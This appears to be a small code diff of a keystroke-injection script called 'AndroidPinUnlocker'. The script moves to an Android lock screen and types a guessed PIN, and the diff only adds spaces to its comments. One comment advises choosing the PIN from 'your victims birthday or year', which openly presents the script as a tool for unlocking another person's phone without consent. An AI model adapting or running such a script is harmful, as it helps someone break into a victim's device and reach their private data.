@@ -1,10 +1,10 @@
 delay(500);
-//LayoutandStuff
+//Layout and Stuff
 layout("DE");
 console.log("AndroidPinUnlockerstarted");
 typingSpeed(300,200);
 delay(800);
-//GettingtothePINScreen
+//Getting to the PIN Screen
 moveStepped(-2000,300);
 console.log("Doubleclickbutton1");
 doubleClick(BT1);
@@ -16,7 +16,7 @@ button(BTNONE);
 moveStepped(-3000,0);
 delay(5000);
 
-//ActualPINtypingnow(you can edit the numbers to whatever you want, i'd recommend using your victims birthday or year if you know it.)
+//Actual PIN typing now (you can edit the numbers to whatever you want, i'd recommend using your victims birthday or year if you know it.)
 
 type("1234\n");
 delay(500);
